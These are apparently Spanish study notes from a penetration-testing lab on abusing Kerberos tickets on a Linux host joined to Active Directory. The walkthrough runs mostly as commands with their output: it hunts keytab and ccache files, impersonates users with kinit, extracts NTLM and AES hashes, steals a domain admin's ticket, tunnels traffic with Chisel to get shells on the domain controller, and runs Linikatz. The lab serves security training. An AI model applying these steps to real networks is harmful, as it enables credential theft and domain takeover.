> Aunque no es común, los equipos **Linux** pueden conectarse a **Active Directory** para proporcionar una gestión de identidades centralizada e integrarse con los sistemas de la organización, permitiendo a los usuarios tener una única identidad para autenticarse tanto en equipos Linux como Windows. Un equipo Linux conectado a **Active Directory** comúnmente utiliza **Kerberos** como sistema de autenticación. Supongamos que este es el caso y logramos comprometer un equipo Linux conectado a Active Directory. En ese caso, podríamos intentar encontrar **tickets Kerberos** para suplantar a otros usuarios y ganar más acceso a la red. Un sistema Linux puede configurarse de diversas maneras para almacenar **tickets Kerberos**.

Un equipo Linux no conectado a Active Directory también puede usar **tickets Kerberos** en scripts o para autenticarse en la red. No es necesario estar unido al dominio para usar tickets Kerberos en un equipo Linux.

### Kerberos en Linux

Tanto **Windows** como **Linux** utilizan el mismo proceso para solicitar un **Ticket Granting Ticket (TGT)** y un **Service Ticket (TGS)**. Sin embargo, la forma en que almacenan la información del ticket puede variar dependiendo de la distribución de Linux y su implementación.

En la mayoría de los casos, los equipos Linux almacenan los tickets Kerberos como archivos **ccache** en el directorio `/tmp`. De forma predeterminada, la ubicación del ticket Kerberos se guarda en la variable de entorno **KRB5CCNAME**. Otro uso común de Kerberos en Linux es con **archivos keytab**. Un **keytab** es un archivo que contiene pares de **principales Kerberos** y **claves cifradas** (que se derivan de la contraseña de Kerberos). Puedes usar un archivo **keytab** para autenticarte en varios sistemas remotos utilizando Kerberos sin necesidad de introducir una contraseña. Sin embargo, cuando cambias tu contraseña, debes volver a crear todos tus archivos **keytab**.

##### Autenticación Linux via port forward

```shell-session
amr251@htb[/htb]$ ssh david@inlanefreight.htb@10.129.204.23 -p 2222

david@inlanefreight.htb@10.129.204.23's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)
 
...SNIP...

Last login: Tue Oct 11 09:30:46 2022 from 172.16.1.5
david@inlanefreight.htb@linux01:~$ 
```

##### Identificando integración AD y Linux

Podemos identificar si la máquina Linux está unida al dominio usando [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd), una herramienta utilizada para administrar el sistema en un dominio y establecer qué usuarios o grupos de dominio tienen permiso para accdeder a los recursos locales del sistema. 

```shell-session
david@inlanefreight.htb@linux01:~$ realm list

inlanefreight.htb
  type: kerberos
  realm-name: ...
```

Una forma de verificar si un sistema Linux está unido a un dominio corporativo es mediante el comando `realm`, que indica el dominio y los usuarios autorizados. Si esta herramienta no está disponible, también se pueden identificar otros servicios como `sssd` o `winbind`, que se usan para la integración con Active Directory. Esto permite a los usuarios autenticarse con credenciales corporativas, pero también puede representar un punto débil si no se configura correctamente.

##### PS - Comprobar si una máquina Linux está unida a un dominio

```bash
ps -ef | grep -i "winbind\|sssd"
```

La salida del comando muestra que el servicio `sssd` está activo y funcionando, lo cual confirma que la máquina está unida a un dominio, en este caso `inlanefreight.htb`. Esto implica que se están utilizando mecanismos de autenticación basados en Active Directory para los usuarios, como David.

##### Búsqueda de tickets Kerberos en Linux:

Como atacante, uno de los principales objetivos es encontrar credenciales. En máquinas Linux unidas a un dominio, es habitual buscar tickets Kerberos para obtener más acceso dentro del entorno. Estos tickets pueden estar ubicados en distintos sitios, dependiendo de cómo esté configurado el sistema o de si el administrador ha cambiado la configuración por defecto.

##### Búsqueda de archivos Keytab

Una forma directa de buscar tickets Kerberos es localizar (`find`) archivos con el nombre que contenga la palabra "keytab". Los administradores suelen crear tickets Kerberos con este tipo de archivo para ser usados en scripts automatizados. Aunque no es obligatorio usar la extensión `.keytab`, es una práctica común para referirse a este tipo de archivo que contiene credenciales de autenticación.

```shell-session
david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null

<SNIP>

   131610      4 -rw-------   1 root     root         1348 Oct  4 16:26 /etc/krb5.keytab
   262169      4 -rw-rw-rw-   1 root     root          216 Oct 12 15:13 /opt/specialfiles/carlos.keytab
```

Otra forma de encontrar archivos **keytab** es buscando en scripts automatizados que están configurados mediante **cronjobs** u otros servicios de Linux. Si un administrador necesita ejecutar un script para interactuar con un servicio de Windows que utiliza Kerberos, y si el archivo keytab no tiene la extensión `.keytab`, es posible que el nombre del archivo se encuentre dentro del propio script.

```shell-session
carlos@inlanefreight.htb@linux01:~$ crontab -l

# Edit this file to introduce tasks to be run by cron.
# 
<SNIP>
# 
# m h  dom mon dow   command
*5/ * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
#!/bin/bash

kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
```

En el script anterior, observamos el uso de `kinit`, lo cual indica que se está utilizando **Kerberos**. El comando `kinit` permite interactuar con Kerberos y su función es solicitar el TGT (Ticket Granting Ticket) del usuario y almacenarlo en la caché (archivo **ccache**). Esto significa que podemos usar `kinit` para importar un archivo **keytab** a nuestra sesión y actuar como el usuario correspondiente. En este ejemplo, se encontró un script que importa un ticket Kerberos (`svc_workstations.kt`) para el usuario `svc_workstations@INLANEFREIGHT.HTB` antes de intentar conectarse a una carpeta compartida. Más adelante se explicará cómo usar esos tickets para **suplantar la identidad de usuarios**.

*Nota: Como se mencionó en la sección sobre _Pass the Ticket_ en Windows, una cuenta de equipo necesita un ticket para interactuar con el entorno de Active Directory. De forma similar, una máquina Linux unida al dominio también necesita un ticket. Este ticket se representa como un **archivo keytab**, que por defecto se encuentra en la ruta `/etc/krb5.keytab`, y solo puede ser leído por el usuario **root**. Si un atacante obtiene acceso a este ticket, **podría suplantar la identidad de la cuenta del equipo**, en este caso: `LINUX01$.INLANEFREIGHT.HTB`.*

##### Localizando archivos _ccache_

Un **archivo de caché de credenciales (ccache)** almacena las credenciales de Kerberos mientras estas sigan siendo válidas y, en general, mientras dure la sesión del usuario. Cuando un usuario se autentica en el dominio, se crea un archivo ccache que contiene la información del ticket. La ruta a este archivo se establece en la variable de entorno **`KRB5CCNAME`**. Esta variable es utilizada por herramientas que soportan autenticación Kerberos para localizar los datos necesarios. Por ello, buscar en las variables de entorno del sistema puede revelar la ubicación de esta caché de credenciales Kerberos.

```shell-session
david@inlanefreight.htb@linux01:~$ env | grep -i krb5

KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
```

Por defecto se encuentran en la ruta `/tmp`. Podemos buscar usuarios que han iniciado sesión en el ordenador, y si ganamos acceso como root o un usuario con privilegios, podríamos impersonar un usuario usando su archivo _ccache_ mientras siga siendo válido.

```shell-session
david@inlanefreight.htb@linux01:~$ ls -la /tmp

total 68
drwxrwxrwt 13 root                     root                           4096 Oct  6 16:38 .
drwxr-xr-x 20 root                     root                           4096 Oct  6  2021 ..
-rw-------  1 julio@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  6 16:38 krb5cc_647401106_tBswau
-rw-------  1 david@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  6 15:23 krb5cc_647401107_Gf415d
-rw-------  1 carlos@inlanefreight.htb domain users@inlanefreight.htb 1433 Oct  6 15:43 krb5cc_647402606_qd2Pfh
```

##### Abusando de archivos keytab

Como atacantes, tenemos muchos usos para un archivo keytab. Lo primero que poder hacer es impersonar a un usuario usando `kinit`. Para usar un archivo keytab, necesitamos saber para qué usuario fue creado. `klist` es otra aplicación usada para interactuar con Kerberos en Linux. 

```shell-session
david@inlanefreight.htb@linux01:~$ klist -k -t /opt/specialfiles/carlos.keytab 

Keytab name: FILE:/opt/specialfiles/carlos.keytab
KVNO Timestamp           Principal
---- ------------------- ------------------------------------------------------
   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB
```

El ticket corresponde al usuario Carlos. Podemos impersonarlo con la herramienta mencionada.
##### Impersonando un usuario con un keytab

```shell-session
david@inlanefreight.htb@linux01:~$ klist 

Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: david@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:02:11  10/07/22 03:02:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:02:11
david@inlanefreight.htb@linux01:~$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
david@inlanefreight.htb@linux01:~$ klist 
Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: carlos@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:16:11
```

```shell-session
david@inlanefreight.htb@linux01:~$ smbclient //dc01/carlos -k -c ls

  .                                   D        0  Thu Oct  6 14:46:26 2022
  ..                                  D        0  Thu Oct  6 14:46:26 2022
  carlos.txt                          A       15  Thu Oct  6 14:46:54 2022

                7706623 blocks of size 4096. 4452852 blocks available
```

##### Extracción de keytab

El segundo método será extraer los secretos de un archivo keytab. Podemos intentar romper la contraseña de la cuenta extrayendo los hashes del archivo keytab. Para ello, [KeyTabExtract](https://github.com/sosdave/KeyTabExtract) nos ayudará a extraer información valiosa de archivos `.keytab` del tipo `502-type`, que pueden ser usados para autenticar Linux a Kerberos. El script extraerá información como el realm, hashes, tipo de encriptado.

```shell-session
david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 

[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : carlos/
        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
```

Con el hash NTLM podemos usar un ataque [[Pass the Hash]]. Con el hash AES256 o AES128 podemos forjar nuestros tickets usando Rubeus o intentar romperos con hashcat o john para obtener la contraseña en texto claro. (_Nota: Un archivo keytab puede contener diferentes tipos de hashes y puede ser mergeada para contener múltiples credenciales incluso de distintos usuarios_)La forma más directa es con el hash NTLM. Otra forma rápida es usar https://crackstation.net/.

##### Abusando del keytab _ccache_

Para abusar de un archivo de este tipo, todo lo que necesitamos es privilegios de lectura en dicho archivo. Estos archivos, localizados en `/tmp`, solo pueden ser leídos por el usuario que los creó, pero si conseguimos acceso como root podremos usarlos. Continuando con el escenario previsto, simulamos que hemos conseguido acceso como el usuario `svc_workstations` y nos hemos convertido en root con `sudo su`. Conseguimos su contraseña repitiendo los pasos anteriores, es decir, extrayendo los hashes del keytab de dicho usuario y rompiendo el hash NTLM.

##### Localizando archivos _ccache_

```shell-session
root@linux01:~# ls -la /tmp

total 76
drwxrwxrwt 13 root                               root                           4096 Oct  7 11:35 .
drwxr-xr-x 20 root                               root                           4096 Oct  6  2021 ..
-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct  7 11:35 krb5cc_647401106_HRJDux
-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct  7 11:35 krb5cc_647401106_qMKxc6
-rw-------  1 david@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct  7 10:43 krb5cc_647401107_O0oUWh
-rw-------  1 svc_workstations@inlanefreight.htb domain users@inlanefreight.htb 1535 Oct  7 11:21 krb5cc_647401109_D7gVZF
-rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 3175 Oct  7 11:35 krb5cc_647402606
-rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 1433 Oct  7 11:01 krb5cc_647402606_ZX6KFA
```

Como se puede apreciar, existe un usuario (`julio@inlanefreight.htb`) al que aún no hemos ganado acceso. Podemos confirmar los grupos a los que pertenece con el comando `id`. Tras hacer esto (`id julio@inlanefreight.htb`) vemos que pertenece al grupo de admins de dominio. Podemos intentar impersonar el usuario y ganar acceso al controlador de dominio DC01.

##### Importando el archivo _ccache_ en nuestra sesión actual

```shell-session
oot@linux01:~# klist

klist: No credentials cache found (filename: /tmp/krb5cc_0)
root@linux01:~# cp /tmp/krb5cc_647401106_I8I133 .
root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_I8I133
root@linux01:~# klist
Ticket cache: FILE:/root/krb5cc_647401106_I8I133
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/08/2022 13:25:01
root@linux01:~# smbclient //dc01/C$ -k -c ls -no-pass
  $Recycle.Bin                      DHS        0  Wed Oct  6 17:31:14 2021
  Config.Msi                        DHS        0  Wed Oct  6 14:26:27 2021
  ...SNIP...
```

`klist` muestra la información del ticket. Debemos considerar los valores "valid starting" y "expires". Si la fecha de expiración ha pasadom el ticket no funcionará, pues los archivos ccache son temporales.

### Usando herramientas de ataque Linux con Kerberos

La mayoría de las herramientas de ataque en Linux que interactúan con Windows y Active Directory **soportan autenticación Kerberos**. Si las utilizamos desde una máquina unida al dominio, debemos asegurarnos de que la variable de entorno `KRB5CCNAME` esté correctamente configurada para apuntar al archivo _ccache_ que contiene las credenciales Kerberos.

En caso de que estemos lanzando el ataque desde una máquina **que no es miembro del dominio** (por ejemplo, nuestro equipo de ataque), debemos asegurarnos de que pueda **comunicarse con el KDC (Key Distribution Center) o Controlador de Dominio**, y que la **resolución de nombres del dominio funcione correctamente**.

En el escenario descrito, nuestro equipo atacante **no tiene conexión directa con el KDC/Controlador de Dominio**, por lo que **no puede resolver nombres de dominio mediante él**. Para utilizar Kerberos en este contexto, se requiere:

- Redirigir el tráfico mediante **túneles (proxy)** a través de un equipo intermediario (por ejemplo, **MS01**) usando herramientas como **Chisel** y **Proxychains**.  
- Modificar el archivo `/etc/hosts` para establecer manualmente las direcciones IP del dominio y de las máquinas objetivo.

##### Archivo hosts modificado

```shell-session
amr251@htb[/htb]$ cat /etc/hosts

# Host addresses

172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
172.16.1.5  ms01.inlanefreight.htb  ms01
```

##### Archivo de configuración Proxychains

```shell-session
amr251@htb[/htb]$ cat /etc/proxychains.conf

<SNIP>

[ProxyList]
socks5 127.0.0.1 1080
```

Descargamos [chisel](https://github.com/jpillora/chisel) para continuar, y lo ejecutamos desde nuestra máquina de atacante

```shell-session
amr251@htb[/htb]$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
amr251@htb[/htb]$ gzip -d chisel_1.7.7_linux_amd64.gz
amr251@htb[/htb]$ mv chisel_* chisel && chmod +x ./chisel
amr251@htb[/htb]$ sudo ./chisel server --reverse 

2022/10/10 07:26:15 server: Reverse tunneling enabled
2022/10/10 07:26:15 server: Fingerprint 58EulHjQXAOsBRpxk232323sdLHd0r3r2nrdVYoYeVM=
2022/10/10 07:26:15 server: Listening on http://0.0.0.0:8080
```

Nos conectamos con xfreerdp o rdesktop a MS01 y ejecutamos ahí chisel:

```cmd-session
C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks

2022/10/10 06:34:19 client: Connecting to ws://10.10.14.33:8080
2022/10/10 06:34:20 client: Connected (Latency 125.6177ms)
```

Finalmente, necesitamos transferir el archivo ccache de Jlio desde LINUX01 y crear la variable de entorno `KRB5CCNAME` con el valor correspondiente a la ruta del archivo ccache.

```shell-session
amr251@htb[/htb]$ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```

Para usar el ticket Kerberos necesitamos especificar el nombre de la máquina objetivo (no la IP) y usar el flag `-k`. Si nos salta un prompt para introducir contraseña, podemos incluir también la opción `-no-pass`

```shell-session
amr251@htb[/htb]$ proxychains impacket-wmiexec dc01 -k

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
[*] SMBv3.0 dialect used
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:50713  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
inlanefreight\julio
```

Para usar evil-winrm con Kerberos, necesitamos instalar el paquete Kerberos usada para autenticación de red. Para muchas distros Linux (basadas en Debian) se llama `krb5-user`. Después de configurarlo todo, podemos usar evil-winrm sin problemas:

```shell-session
amr251@htb[/htb]$ proxychains evil-winrm -i dc01 -r inlanefreight.htb

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14

Evil-WinRM shell v3.3

Warning: Remote path completions are disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:5985  ...  OK
*Evil-WinRM* PS C:\Users\julio\Documents> whoami ; hostname
inlanefreight\julio
DC01
```

### Miscelánea

Si queremos usar un archivo ccache en una máquina Windows o un archivo kirbi en una máquina Linux, podemos usar [impacket-ticketConverter](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py). 

```shell-session
amr251@htb[/htb]$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] converting ccache to kirbi...
[+] done
```

Podemos usar la operación inversa si primero seleccionamos el archivo `.kirbi`

```cmd-session
C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
```

##### Linikatz

[Linikatz](https://github.com/CiscoCXSecurity/linikatz) es una herramienta creada por el equipo de seguridad de **Cisco** para la explotación de credenciales en máquinas Linux cuando estas están integradas con **Active Directory**. En otras palabras, **Linikatz traslada el mismo principio de Mimikatz al entorno UNIX**.

Al igual que Mimikatz, **para utilizar Linikatz se requiere acceso root** en la máquina objetivo. Esta herramienta extrae todas las credenciales disponibles, incluidos **tickets Kerberos**, desde diferentes implementaciones como **FreeIPA, SSSD, Samba, Vintella**, entre otras.

Una vez extraídas, las credenciales se almacenan en una carpeta cuyo nombre comienza con `linikatz..`. Dentro de dicha carpeta se encuentran las credenciales en distintos formatos, como **ccache** y **keytab**, los cuales pueden ser utilizados según el caso, como se explicó anteriormente.

```shell-session
amr251@htb[/htb]$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
amr251@htb[/htb]$ /opt/linikatz.sh
 _ _       _ _         _
| (_)_ __ (_) | ____ _| |_ ____
| | | '_ \| | |/ / _` | __|_  /
| | | | | | |   < (_| | |_ / /
|_|_|_| |_|_|_|\_\__,_|\__/___|

             =[ @timb_machine ]=

...SNIP...
```

